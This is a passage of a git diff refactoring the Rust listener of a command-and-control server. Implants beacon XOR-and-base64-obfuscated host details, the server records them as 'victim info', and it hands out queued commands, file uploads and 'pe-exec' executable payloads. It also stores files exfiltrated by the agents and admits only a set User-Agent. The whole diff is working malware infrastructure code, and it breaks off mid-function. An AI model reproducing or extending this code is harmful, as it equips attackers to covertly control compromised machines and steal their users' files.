@@ -1,39 +1,121 @@
 use crate::admin::Database;
 use crate::agents::agent_handler::{AgentHandler, AgentInfo};
 use crate::encryption::XORCipher;
+use crate::helper::helper_listener::{empty_response, json_error, text_response};
 use crate::listener::profile::{ListenerProfile, ListenerProfileHttps};
 use axum::Server;
+use axum::{
+    body::Bytes,
+    extract::{Path, State},
+    http::{HeaderMap, StatusCode},
+    response::{IntoResponse, Response},
+    routing::{get, post},
+    Router,
+};
 use axum_server::tls_rustls::RustlsConfig;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use serde::{Deserialize, Serialize};
 use std::net::SocketAddr;
 use std::sync::Arc;
 
-use axum::{
-    body::Bytes,
-    extract::{Path, State},
-    http::{HeaderMap, StatusCode},
-    response::{IntoResponse, Response},
-    routing::get,
-    routing::post,
-    Router,
-};
+// ============================================================================
+// STATE
+// ============================================================================
 
 #[derive(Clone)]
-struct HttpListenerState {
+pub struct ListenerState {
     profile: ListenerProfile,
     agent_handler: AgentHandler,
     xor_cipher: Arc<XORCipher>,
     database: Arc<Database>,
 }
 
-#[derive(Clone)]
-struct HttpsListenerState {
-    profile: ListenerProfileHttps,
-    agent_handler: AgentHandler,
-    xor_cipher: Arc<XORCipher>,
-    database: Arc<Database>,
+impl ListenerState {
+    pub fn new(
+        profile: ListenerProfile,
+        agent_handler: AgentHandler,
+        database: Arc<Database>,
+    ) -> Self {
+        let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
+        Self {
+            profile,
+            agent_handler,
+            xor_cipher,
+            database,
+        }
+    }
+
+    fn decrypt_body(&self, body: &Bytes) -> Result<String, ListenerError> {
+        let body_str = std::str::from_utf8(body)
+            .map_err(|_| ListenerError::InvalidUtf8)?
+            .trim();
+
+        let encrypted = STANDARD
+            .decode(body_str)
+            .map_err(|_| ListenerError::Base64Decode)?;
+
+        let decrypted = self.xor_cipher.decrypt(&encrypted);
+
+        String::from_utf8(decrypted).map_err(|_| ListenerError::InvalidUtf8)
+    }
+
+    fn encrypt_response<T: Serialize>(&self, data: &T) -> String {
+        let json = serde_json::to_string(data).unwrap_or_default();
+        let encrypted = self.xor_cipher.encrypt(json.as_bytes());
+        STANDARD.encode(&encrypted)
+    }
+
+    fn validate_user_agent(&self, headers: &HeaderMap) -> Result<(), ListenerError> {
+        match headers.get("user-agent").and_then(|h| h.to_str().ok()) {
+            Some(ua) if ua == self.profile.user_agent => Ok(()),
+            _ => Err(ListenerError::InvalidUserAgent),
+        }
+    }
 }
+
+// ============================================================================
+// ERROR HANDLING
+// ============================================================================
+
+#[derive(Debug)]
+enum ListenerError {
+    InvalidUserAgent,
+    InvalidUtf8,
+    Base64Decode,
+    JsonParse,
+    Database(String),
+}
+
+impl ListenerError {
+    fn status_code(&self) -> StatusCode {
+        match self {
+            Self::InvalidUserAgent => StatusCode::FORBIDDEN,
+            Self::InvalidUtf8 | Self::Base64Decode | Self::JsonParse => StatusCode::BAD_REQUEST,
+            Self::Database(_) => StatusCode::INTERNAL_SERVER_ERROR,
+        }
+    }
+
+    fn log_message(&self) -> &str {
+        match self {
+            Self::InvalidUserAgent => "Invalid or missing User-Agent",
+            Self::InvalidUtf8 => "Invalid UTF-8 in request",
+            Self::Base64Decode => "Base64 decode failed",
+            Self::JsonParse => "JSON parse failed",
+            Self::Database(msg) => msg,
+        }
+    }
+}
+
+impl IntoResponse for ListenerError {
+    fn into_response(self) -> Response {
+        log::warn!("[LISTENER] {}", self.log_message());
+        empty_response(self.status_code()).into_response()
+    }
+}
+
+// ============================================================================
+// DATA STRUCTURES
+// ============================================================================
 
 #[derive(Debug, Deserialize, Serialize)]
 struct AgentBeacon {
@@ -46,7 +128,7 @@ struct AgentBeacon {
 }
 
 #[derive(Serialize)]
-struct AgentCheckinResponse {
+struct CheckinResponse {
     success: bool,
     message: String,
 }
@@ -57,128 +139,212 @@ struct CommandItem {
     command: String,
 }
 
-#[derive(Serialize, Deserialize, Debug)]
+#[derive(Serialize)]
 struct CommandResponse {
     success: bool,
     commands: Vec<CommandItem>,
 }
 
+#[derive(Deserialize)]
+struct CommandRequest {
+    agent_id: String,
+}
+
+#[derive(Deserialize)]
+struct ResultSubmit {
+    agent_id: String,
+    command_id: Option<i64>,
+    output: String,
+    success: bool,
+    r#types: String,
+}
+
+// ============================================================================
+// HANDLERS
+// ============================================================================
+
 async fn handle_beacon(
-    State(state): State<Arc<HttpListenerState>>,
+    State(state): State<Arc<ListenerState>>,
     headers: HeaderMap,
     body: Bytes,
-) -> impl IntoResponse {
-    // ===== Vérification User-Agent =====
-    if let Some(user_agent) = headers.get("user-agent") {
-        if user_agent.to_str().unwrap_or("") != state.profile.user_agent {
-            log::warn!("[LISTENER] Invalid User-Agent detected");
-            return Response::builder()
-                .status(StatusCode::FORBIDDEN)
-                .body("".to_string())
-                .unwrap();
-        }
-    } else {
-        log::warn!("[LISTENER] Missing User-Agent header");
-        return Response::builder()
-            .status(StatusCode::FORBIDDEN)
-            .body("".to_string())
-            .unwrap();
-    }
+) -> Result<Response<String>, ListenerError> {
+    state.validate_user_agent(&headers)?;
 
-    // ===== Décodage du body =====
-    let body_str = match std::str::from_utf8(&body) {
-        Ok(s) => s.trim(),
-        Err(e) => {
-            log::error!("[LISTENER] Invalid UTF-8 in body: {}", e);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
+    let json_data = state.decrypt_body(&body)?;
+    log::debug!("[LISTENER] Decrypted beacon: {}", json_data);
 
-    log::debug!(
-        "[LISTENER] Received base64 data (length: {})",
-        body_str.len()
-    );
-
-    let xor_encrypted_data = match STANDARD.decode(body_str) {
-        Ok(data) => data,
-        Err(e) => {
-            log::error!("[LISTENER] Base64 decode failed: {}", e);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    log::debug!(
-        "[LISTENER] Base64 decoded length: {} bytes",
-        xor_encrypted_data.len()
-    );
-
-    // ===== Déchiffrement XOR =====
-    let decrypted_bytes = state.xor_cipher.decrypt(&xor_encrypted_data);
-
-    let json_data = match String::from_utf8(decrypted_bytes) {
-        Ok(s) => s,
-        Err(e) => {
-            log::error!("[LISTENER] Decrypted data is not valid UTF-8: {}", e);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    log::info!("[LISTENER] Decrypted JSON: {}", json_data);
-
-    // ===== Parser le JSON =====
-    let beacon: AgentBeacon = match serde_json::from_str(&json_data) {
-        Ok(b) => b,
-        Err(e) => {
-            log::error!("[LISTENER] Failed to parse beacon JSON: {}", e);
-            log::error!("[LISTENER] Raw decrypted data: '{}'", json_data);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
+    let beacon: AgentBeacon =
+        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;
 
     log::info!(
-        "[+] Beacon received from agent: {} ({}@{} - {})",
+        "[+] Beacon from agent {} ({}@{} - {})",
         beacon.agent_id,
         beacon.username,
         beacon.hostname,
         beacon.ip_address
     );
 
+    update_or_register_agent(&state, &beacon);
+
+    if let Err(e) = state.database.update_victim_info(
+        &beacon.agent_id,
+        &beacon.hostname,
+        &beacon.username,
+        "Windows",
+        &beacon.ip_address,
+        &beacon.process_name,
+    ) {
+        log::warn!("[!] Failed to update victim info: {}", e);
+    }
+
+    if !beacon.results.is_empty() {
+        process_beacon_results(&state, &beacon);
+    }
+
+    let response = CheckinResponse {
+        success: true,
+        message: "Check-in successful".to_string(),
+    };
+
+    Ok(text_response(
+        StatusCode::OK,
+        state.encrypt_response(&response),
+    ))
+}
+
+async fn handle_get_commands(
+    State(state): State<Arc<ListenerState>>,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Result<Response<String>, ListenerError> {
+    state.validate_user_agent(&headers)?;
+
+    let json_data = state.decrypt_body(&body)?;
+    let request: CommandRequest =
+        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;
+
+    log::info!("[+] Command request from agent {}", request.agent_id);
+
+    let commands = fetch_commands_with_data(&state, &request.agent_id);
+
+    let response = CommandResponse {
+        success: true,
+        commands,
+    };
+
+    Ok(text_response(
+        StatusCode::OK,
+        state.encrypt_response(&response),
+    ))
+}
+
+async fn handle_submit_result(
+    State(state): State<Arc<ListenerState>>,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Result<Response<String>, ListenerError> {
+    state.validate_user_agent(&headers)?;
+
+    let json_data = state.decrypt_body(&body)?;
+    let result: ResultSubmit =
+        serde_json::from_str(&json_data).map_err(|_| ListenerError::JsonParse)?;
+
+    log::info!(
+        "[+] Result | agent={} | cmd={:?} | type={} | success={} | len={}",
+        result.agent_id,
+        result.command_id,
+        result.r#types,
+        result.success,
+        result.output.len()
+    );
+
+    let (output_to_store, filename) = extract_result_content(&result);
+
+    match state.database.store_result(
+        &result.agent_id,
+        result.command_id,
+        &output_to_store,
+        result.success,
+        Some(&result.r#types),
+    ) {
+        Ok(result_id) => {
+            let filename_log = filename
+                .or_else(|| {
+                    result
+                        .command_id
+                        .and_then(|id| state.database.extract_filename_from_command_id(id))
+                })
+                .unwrap_or_else(|| "None".to_string());
+
+            log::info!(
+                "[+] Result stored | id={} | file={} | size={}",
+                result_id,
+                filename_log,
+                output_to_store.len()
+            );
+        }
+        Err(e) => {
+            log::error!("[!] Failed to store result: {}", e);
+            return Err(ListenerError::Database(e.to_string()));
+        }
+    }
+
+    let response = serde_json::json!({ "success": true });
+    Ok(text_response(
+        StatusCode::OK,
+        state.encrypt_response(&response),
+    ))
+}
+
+async fn handle_pe_data(
+    State(state): State<Arc<ListenerState>>,
+    Path(command_id): Path<i64>,
+) -> Response<String> {
+    log::info!("[PE-DATA] Request for command {}", command_id);
+
+    match state.database.get_pe_exec_data_by_command(command_id) {
+        Ok(Some(pe_data)) => {
+            log::info!(
+                "[PE-DATA] Found | cmd={} | size={} bytes",
+                command_id,
+                pe_data.len()
+            );
+
+            let encrypted = state.xor_cipher.encrypt(pe_data.as_bytes());
+            let encoded = STANDARD.encode(&encrypted);
+
+            text_response(StatusCode::OK, encoded)
+        }
+        Ok(None) => {
+            log::warn!("[PE-DATA] Not found for command {}", command_id);
+            json_error(StatusCode::NOT_FOUND, "PE data not found")
+        }
+        Err(e) => {
+            log::error!("[PE-DATA] Database error: {}", e);
+            json_error(StatusCode::INTERNAL_SERVER_ERROR, &e.to_string())
+        }
+    }
+}
+
+// ============================================================================
+// HELPER FUNCTIONS
+// ============================================================================
+
+fn update_or_register_agent(state: &ListenerState, beacon: &AgentBeacon) {
     let timestamp = AgentHandler::get_current_timestamp();
 
-    // ===== MODIFICATION: Vérifier si l'agent existe AVANT de l'enregistrer =====
-    if let Some(mut existing_agent) = state.agent_handler.get_agent(&beacon.agent_id) {
-        log::debug!(
-            "[*] Agent {} already exists, updating info",
-            beacon.agent_id
-        );
-
-        // Mettre à jour uniquement les champs dynamiques
-        existing_agent.hostname = Some(beacon.hostname.clone());
-        existing_agent.username = Some(beacon.username.clone());
-        existing_agent.process_name = Some(beacon.process_name.clone());
-        existing_agent.ip = Some(beacon.ip_address.clone());
-        existing_agent.last_seen = timestamp;
+    if let Some(mut agent) = state.agent_handler.get_agent(&beacon.agent_id) {
+        agent.hostname = Some(beacon.hostname.clone());
+        agent.username = Some(beacon.username.clone());
+        agent.process_name = Some(beacon.process_name.clone());
+        agent.ip = Some(beacon.ip_address.clone());
+        agent.last_seen = timestamp;
 
         state
             .agent_handler
-            .update_agent(&beacon.agent_id, existing_agent, Some(&state.database));
+            .update_agent(&beacon.agent_id, agent, Some(&state.database));
     } else {
-        log::info!(
-            "[+] ✅ New agent detected, registering: {}",
-            beacon.agent_id
-        );
+        log::info!("[+] New agent detected: {}", beacon.agent_id);
 
         let agent_info = AgentInfo {
             agent_id: beacon.agent_id.clone(),
@@ -198,626 +364,193 @@ async fn handle_beacon(
             Some(&state.database),
         );
     }
-
-    // ===== Mettre à jour les informations de la victime dans la DB =====
-    if let Err(e) = state.database.update_victim_info(
-        &beacon.agent_id,
-        &beacon.hostname,
-        &beacon.username,
-        "Windows",
-        &beacon.ip_address,
-        &beacon.process_name,
-    ) {
-        log::warn!("[!] Failed to update victim info: {}", e);
-    }
-
-    // ===== Traiter les résultats si présents =====
-    if !beacon.results.is_empty() {
-        log::info!("[+] Task result received from {}", beacon.agent_id);
-        state
-            .agent_handler
-            .push_result(&beacon.agent_id, beacon.results.clone());
-
-        let (output_to_store, result_type, filename) = {
-            // Vérifier d'abord si c'est un message texte simple
-            if beacon.results.starts_with("File uploaded successfully")
-                || beacon.results.starts_with("Upload successful")
-                || beacon.results.starts_with("Error:")
-            {
-                log::info!("[+] Upload confirmation or error message received");
-                (beacon.results.clone(), "text", None)
-            } else {
-                // Sinon, c'est probablement un résultat encodé (download)
-                let decoded_str = if let Ok(decoded_bytes) = STANDARD.decode(&beacon.results) {
-                    String::from_utf8(decoded_bytes).unwrap_or_else(|_| beacon.results.clone())
-                } else {
-                    beacon.results.clone()
-                };
-
-                log::debug!(
-                    "[DEBUG] Decoded beacon results (first 200 chars): {}",
-                    &decoded_str[..decoded_str.len().min(200)]
-                );
-
-                // Vérifier si c'est un message d'erreur après décodage
-                if decoded_str.starts_with("Error:") {
-                    log::warn!("[!] Beacon result is an error message");
-                    (decoded_str, "text", None)
-                } else {
-                    // Parser le JSON décodé (résultat de download)
-                    let normalized = decoded_str.replace('\'', "\"");
-                    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
-                        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
-                            let fname = parsed
-                                .get("filename")
-                                .and_then(|v| v.as_str())
-                                .map(|s| s.to_string());
-
-                            if let Some(ref f) = fname {
-                                log::info!(
-                                    "[+] ✅ File parsed from beacon | filename='{}' | base64_length={}",
-                                    f,
-                                    content.len()
-                                );
-                            }
-
-                            (content.to_string(), "file_download", fname)
-                        } else {
-                            (decoded_str, "text", None)
-                        }
-                    } else {
-                        (decoded_str, "text", None)
-                    }
-                }
-            }
-        };
-
-        if let Err(e) = state.database.store_result(
-            &beacon.agent_id,
-            None,
-            &output_to_store,
-            true,
-            Some(result_type),
-        ) {
-            log::warn!("[!] Failed to store result in DB: {}", e);
-        } else {
-            log::info!(
-                "[+] ✅ Result stored | type={} | filename={:?} | stored_size={}",
-                result_type,
-                filename,
-                output_to_store.len()
-            );
-        }
-    }
-
-    log::debug!(
-        "[LISTENER] Heartbeat processed for agent {}",
-        beacon.agent_id
-    );
-
-    // ===== Créer la réponse (SANS commandes) =====
-    let response = AgentCheckinResponse {
-        success: true,
-        message: "Check-in successful".to_string(),
-    };
-
-    let response_json = match serde_json::to_string(&response) {
-        Ok(json) => json,
-        Err(e) => {
-            log::error!("[LISTENER] Failed to serialize response: {}", e);
-            return Response::builder()
-                .status(StatusCode::INTERNAL_SERVER_ERROR)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    log::debug!("[LISTENER] Response JSON: {}", response_json);
-
-    let encrypted_response = state.xor_cipher.encrypt(response_json.as_bytes());
-    let encoded_response = STANDARD.encode(&encrypted_response);
-
-    log::debug!(
-        "[LISTENER] Sending encrypted response (base64 length: {})",
-        encoded_response.len()
-    );
-
-    Response::builder()
-        .status(StatusCode::OK)
-        .header("Content-Type", "text/plain")
-        .body(encoded_response)
-        .unwrap()
 }
 
-async fn handle_get_commands(
-    State(state): State<Arc<HttpListenerState>>,
-    headers: HeaderMap,
-    body: Bytes,
-) -> impl IntoResponse {
-    // ===== 1. Vérifier User-Agent =====
-    if let Some(user_agent) = headers.get("user-agent") {
-        if user_agent.to_str().unwrap_or("") != state.profile.user_agent {
-            log::warn!("[LISTENER] Invalid User-Agent for /api/command");
-            return Response::builder()
-                .status(StatusCode::FORBIDDEN)
-                .body("".to_string())
-                .unwrap();
-        }
+fn process_beacon_results(state: &ListenerState, beacon: &AgentBeacon) {
+    log::info!("[+] Processing results from {}", beacon.agent_id);
+
+    state
+        .agent_handler
+        .push_result(&beacon.agent_id, beacon.results.clone());
+
+    let (output, result_type, filename) = parse_beacon_result(&beacon.results);
+
+    if let Err(e) =
+        state
+            .database
+            .store_result(&beacon.agent_id, None, &output, true, Some(result_type))
+    {
+        log::warn!("[!] Failed to store beacon result: {}", e);
     } else {
-        log::warn!("[LISTENER] Missing User-Agent header");
-        return Response::builder()
-            .status(StatusCode::FORBIDDEN)
-            .body("".to_string())
-            .unwrap();
+        log::info!(
+            "[+] Result stored | type={} | file={:?} | size={}",
+            result_type,
+            filename,
+            output.len()
+        );
+    }
+}
+
+fn parse_beacon_result(results: &str) -> (String, &'static str, Option<String>) {
+    if results.starts_with("File uploaded successfully")
+        || results.starts_with("Upload successful")
+        || results.starts_with("Error:")
+    {
+        return (results.to_string(), "text", None);
     }
 
-    // ===== 2. Décoder le body =====
-    let body_str = match std::str::from_utf8(&body) {
-        Ok(s) => s.trim(),
-        Err(_) => {
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
+    let decoded = match STANDARD.decode(results) {
+        Ok(bytes) => String::from_utf8(bytes).unwrap_or_else(|_| results.to_string()),
+        Err(_) => results.to_string(),
     };
 
-    let encrypted = match STANDARD.decode(body_str) {
-        Ok(d) => d,
-        Err(_) => {
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    let decrypted = state.xor_cipher.decrypt(&encrypted);
-    let json_data = match String::from_utf8(decrypted) {
-        Ok(s) => s,
-        Err(_) => {
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    #[derive(Deserialize)]
-    struct CommandRequest {
-        agent_id: String,
+    if decoded.starts_with("Error:") {
+        return (decoded, "text", None);
     }
 
-    let request: CommandRequest = match serde_json::from_str(&json_data) {
-        Ok(r) => r,
-        Err(_) => {
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
+    let normalized = decoded.replace('\'', "\"");
+    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
+        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
+            let filename = parsed
+                .get("filename")
+                .and_then(|v| v.as_str())
+                .map(|s| s.to_string());
+
+            return (content.to_string(), "file_download", filename);
         }
+    }
+
+    (decoded, "text", None)
+}
+
+fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>) {
+    if result.r#types != "file" {
+        return (result.output.clone(), None);
+    }
+
+    let decoded = match STANDARD.decode(&result.output) {
+        Ok(bytes) => match String::from_utf8(bytes) {
+            Ok(s) => s,
+            Err(_) => return (result.output.clone(), None),
+        },
+        Err(_) => return (result.output.clone(), None),
     };
 
-    log::info!("[+] Command request from agent {}", request.agent_id);
+    if decoded.starts_with("Error:") || !result.success {
+        return (decoded, None);
+    }
 
-    // ===== 3. Récupérer les commandes PENDING =====
-    let mut commands_with_data = Vec::new();
+    let normalized = decoded.replace('\'', "\"");
+    match serde_json::from_str::<serde_json::Value>(&normalized) {
+        Ok(parsed) => {
+            let content = parsed
+                .get("content")
+                .and_then(|v| v.as_str())
+                .map(|s| s.to_string());
+            let filename = parsed
+                .get("filename")
+                .and_then(|v| v.as_str())
+                .map(|s| s.to_string());
 
-    match state.database.get_pending_commands(&request.agent_id) {
-        Ok(cmds) => {
-            for (cmd_id, cmd) in cmds {
-                // ===== UPLOAD =====
-                if cmd.contains("'upload':") {
-                    if let Ok(Some(upload_data)) =
-                        state.database.get_upload_data_for_command(cmd_id)
-                    {
-                        commands_with_data.push(CommandItem {
-                            id: cmd_id,
-                            command: format!("'upload':'{}'", upload_data),
-                        });
-                    } else {
-                        commands_with_data.push(CommandItem {
-                            id: cmd_id,
-                            command: cmd,
-                        });
-                    }
+            match (content, filename.clone()) {
+                (Some(c), Some(f)) => {
+                    log::info!("[+] File parsed | name='{}' | size={}", f, c.len());
+                    (c, Some(f))
                 }
-                // ===== PE-EXEC =====
-                else if cmd.contains("'pe-exec':") {
-                    if let Ok(Some(pe_data)) = state.database.get_pe_exec_data_by_command(cmd_id) {
-                        commands_with_data.push(CommandItem {
-                            id: cmd_id,
-                            command: format!("'pe-exec':'{}'", pe_data),
-                        });
-                    } else {
-                        commands_with_data.push(CommandItem {
-                            id: cmd_id,
-                            command: cmd,
-                        });
-                    }
-                }
-                // ===== STANDARD =====
-                else {
-                    commands_with_data.push(CommandItem {
-                        id: cmd_id,
-                        command: cmd,
-                    });
-                }
+                _ => (decoded, None),
             }
         }
+        Err(_) => (decoded, None),
+    }
+}
+
+fn fetch_commands_with_data(state: &ListenerState, agent_id: &str) -> Vec<CommandItem> {
+    let mut commands = Vec::new();
+
+    let pending = match state.database.get_pending_commands(agent_id) {
+        Ok(cmds) => cmds,
         Err(e) => {
             log::error!("[!] Failed to fetch commands: {}", e);
-        }
-    }
-
-    // ===== 4. Construire la réponse =====
-    let response = CommandResponse {
-        success: true,
-        commands: commands_with_data,
-    };
-
-    let response_json = match serde_json::to_string(&response) {
-        Ok(j) => j,
-        Err(_) => {
-            return Response::builder()
-                .status(StatusCode::INTERNAL_SERVER_ERROR)
-                .body("".to_string())
-                .unwrap();
+            return commands;
         }
     };
 
-    let encrypted_response = state.xor_cipher.encrypt(response_json.as_bytes());
-    let encoded_response = STANDARD.encode(&encrypted_response);
-
-    Response::builder()
-        .status(StatusCode::OK)
-        .header("Content-Type", "text/plain")
-        .body(encoded_response)
-        .unwrap()
-}
-
-async fn handle_submit_result(
-    State(state): State<Arc<HttpListenerState>>,
-    headers: HeaderMap,
-    body: Bytes,
-) -> impl IntoResponse {
-    // ===== Vérification User-Agent =====
-    if headers.get("user-agent").and_then(|ua| ua.to_str().ok()) != Some(&state.profile.user_agent)
-    {
-        log::warn!("[LISTENER] Invalid User-Agent for /api/result");
-        return Response::builder()
-            .status(StatusCode::FORBIDDEN)
-            .body("".to_string())
-            .unwrap();
-    }
-
-    // ===== Décodage Base64 du body =====
-    let body_str = match std::str::from_utf8(&body) {
-        Ok(s) => s.trim(),
-        Err(_) => {
-            log::error!("[LISTENER] Invalid UTF-8 in body");
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    let encrypted = match STANDARD.decode(body_str) {
-        Ok(d) => d,
-        Err(e) => {
-            log::error!("[LISTENER] Base64 decode failed: {}", e);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    // ===== Déchiffrement XOR =====
-    let decrypted = state.xor_cipher.decrypt(&encrypted);
-
-    let json_data = match String::from_utf8(decrypted) {
-        Ok(s) => s,
-        Err(e) => {
-            log::error!("[LISTENER] Decrypted data is not valid UTF-8: {}", e);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    // ===== Structure attendue de l'agent =====
-    #[derive(Deserialize)]
-    struct ResultSubmit {
-        agent_id: String,
-        command_id: Option<i64>,
-        output: String,
-        success: bool,
-        r#types: String,
-    }
-
-    let result: ResultSubmit = match serde_json::from_str(&json_data) {
-        Ok(r) => r,
-        Err(e) => {
-            log::error!("[LISTENER] JSON parse error: {}", e);
-            log::error!("[LISTENER] Raw decrypted data: '{}'", json_data);
-            return Response::builder()
-                .status(StatusCode::BAD_REQUEST)
-                .body("".to_string())
-                .unwrap();
-        }
-    };
-
-    log::info!(
-        "[+] Result received | agent={} | cmd={:?} | type={} | success={} | output_length={}",
-        result.agent_id,
-        result.command_id,
-        result.r#types,
-        result.success,
-        result.output.len()
-    );
-
-    // ===== EXTRACTION DU CONTENU SI C'EST UN FICHIER =====
-    let (output_to_store, extracted_filename) = if result.r#types == "file" {
-        // ÉTAPE 1: Décoder le Base64 pour obtenir le JSON ou message d'erreur
-        let decoded_output = match STANDARD.decode(&result.output) {
-            Ok(bytes) => match String::from_utf8(bytes) {
-                Ok(s) => s,
-                Err(e) => {
-                    log::error!("[!] Decoded base64 is not valid UTF-8: {}", e);
-                    return Response::builder()
-                        .status(StatusCode::BAD_REQUEST)
-                        .body("".to_string())
-                        .unwrap();
-                }
-            },
-            Err(e) => {
-                log::warn!(
-                    "[!] Failed to decode base64 output (might be plain text): {}",
-                    e
-                );
-                result.output.clone()
-            }
+    for (cmd_id, cmd) in pending {
+        let command = if cmd.contains("'upload':") {
+            state
+                .database
+                .get_upload_data_for_command(cmd_id)
+                .ok()
+                .flatten()
+                .map(|data| format!("'upload':'{}'", data))
+                .unwrap_or(cmd)
+        } else if cmd.contains("'pe-exec':") {
+            state
+                .database
+                .get_pe_exec_data_by_command(cmd_id)
+                .ok()
+                .flatten()
+                .map(|data| format!("'pe-exec':'{}'", data))
+                .unwrap_or(cmd)
+        } else {
+            cmd
         };
 
-        log::info!(
-            "[DEBUG] Decoded output (first 200 chars): {}",
-            &decoded_output[..decoded_output.len().min(200)]
-        );
-
-        // Vérifier si c'est un message d'erreur
-        if decoded_output.starts_with("Error:") || !result.success {
-            log::warn!("[!] Agent returned error: {}", decoded_output);
-            (decoded_output, None)
-        } else {
-            // ÉTAPE 2: Parser le JSON (avec quotes simples → doubles)
-            let normalized = decoded_output.replace('\'', "\"");
-
-            match serde_json::from_str::<serde_json::Value>(&normalized) {
-                Ok(parsed) => {
-                    let content = parsed
-                        .get("content")
-                        .and_then(|v| v.as_str())
-                        .map(|s| s.to_string());
-
-                    let filename = parsed
-                        .get("filename")
-                        .and_then(|v| v.as_str())
-                        .map(|s| s.to_string());
-
-                    match (content, filename.clone()) {
-                        (Some(c), Some(f)) => {
-                            log::info!(
-                                "[+] ✅ File parsed successfully | filename='{}' | content_base64_length={}",
-                                f,
-                                c.len()
-                            );
-                            (c, Some(f))
-                        }
-                        _ => {
-                            log::warn!(
-                                "[!] JSON missing content or filename, storing decoded output"
-                            );
-                            (decoded_output, None)
-                        }
-                    }
-                }
-                Err(e) => {
-                    log::warn!(
-                        "[!] Not a JSON file structure (probably text result): {}",
-                        e
-                    );
-                    (decoded_output, None)
-                }
-            }
-        }
-    } else {
-        // Pour les résultats texte
-        (result.output.clone(), None)
-    };
-
-    log::info!("[DEBUG] Will store {} bytes in DB", output_to_store.len());
-
-    // ===== STOCKER DANS LA DB =====
-    match state.database.store_result(
-        &result.agent_id,
-        result.command_id,
-        &output_to_store,
-        result.success,
-        Some(&result.r#types),
-    ) {
-        Ok(result_id) => {
-            let filename_log = extracted_filename
-                .or_else(|| {
-                    if let Some(cmd_id) = result.command_id {
-                        state.database.extract_filename_from_command_id(cmd_id)
-                    } else {
-                        None
-                    }
-                })
-                .unwrap_or_else(|| "None".to_string());
-
-            log::info!(
-                "[+] ✅ Result stored | result_id={} | filename={} | stored_size={} | success={}",
-                result_id,
-                filename_log,
-                output_to_store.len(),
-                result.success
-            );
-        }
-        Err(e) => {
-            log::error!("[!] ❌ Failed to store result | error={}", e);
-            return Response::builder()
-                .status(StatusCode::INTERNAL_SERVER_ERROR)
-                .body("".to_string())
-                .unwrap();
-        }
+        commands.push(CommandItem {
+            id: cmd_id,
+            command,
+        });
     }
 
-    // ===== Réponse à l'agent =====
-    let response = serde_json::json!({
-        "success": true
-    });
-
-    let encrypted_response = state
-        .xor_cipher
-        .encrypt(serde_json::to_string(&response).unwrap().as_bytes());
-
-    let encoded_response = STANDARD.encode(encrypted_response);
-
-    Response::builder()
-        .status(StatusCode::OK)
-        .header("Content-Type", "text/plain")
-        .body(encoded_response)
-        .unwrap()
+    commands
 }
 
-#[derive(Serialize)]
-struct ApiResponse {
-    success: bool,
-    message: String,
-}
+fn build_router(state: Arc<ListenerState>) -> Router {
+    let uri_path = state.profile.uri_paths.clone();
 
-async fn get_pe_exec_data(
-    State(state): State<Arc<HttpListenerState>>,
-    Path(command_id): Path<i64>,
-) -> impl IntoResponse {
-    log::info!(
-        "[PE-DATA] Agent requesting PE-exec data for command {}",
-        command_id
-    );
-
-    match state.database.get_pe_exec_data_by_command(command_id) {
-        Ok(Some(pe_json_data)) => {
-            log::info!(
-                "[PE-DATA] ✅ PE-exec data found | command={} | size={} bytes",
-                command_id,
-                pe_json_data.len()
-            );
-
-            let encrypted_payload = state.xor_cipher.encrypt(pe_json_data.as_bytes());
-
-            log::info!(
-                "[PE-DATA] Encrypted | size={} bytes",
-                encrypted_payload.len()
-            );
-
-            let final_response = STANDARD.encode(&encrypted_payload);
-
-            log::info!(
-                "[PE-DATA] ✅ Sending response | final_size={} bytes",
-                final_response.len()
-            );
-
-            Response::builder()
-                .status(StatusCode::OK)
-                .header("Content-Type", "text/plain")
-                .header("Content-Length", final_response.len().to_string())
-                .body(final_response)
-                .unwrap()
-        }
-        Ok(None) => {
-            log::warn!(
-                "[PE-DATA] ❌ No PE-exec data found for command {}",
-                command_id
-            );
-
-            let resp = ApiResponse {
-                success: false,
-                message: format!("No PE-exec data found for command {}", command_id),
-            };
-
-            let json = serde_json::to_string(&resp).unwrap_or_else(|_| "{}".to_string());
-
-            Response::builder()
-                .status(StatusCode::NOT_FOUND)
-                .header("Content-Type", "application/json")
-                .body(json)
-                .unwrap()
-        }
-        Err(e) => {
-            log::error!("[PE-DATA] ❌ Database error: {}", e);
-
-            let resp = ApiResponse {
-                success: false,
-                message: format!("Database error: {}", e),
-            };
-
-            let json = serde_json::to_string(&resp).unwrap_or_else(|_| "{}".to_string());
-
-            Response::builder()
-                .status(StatusCode::INTERNAL_SERVER_ERROR)
-                .header("Content-Type", "application/json")
-                .body(json)
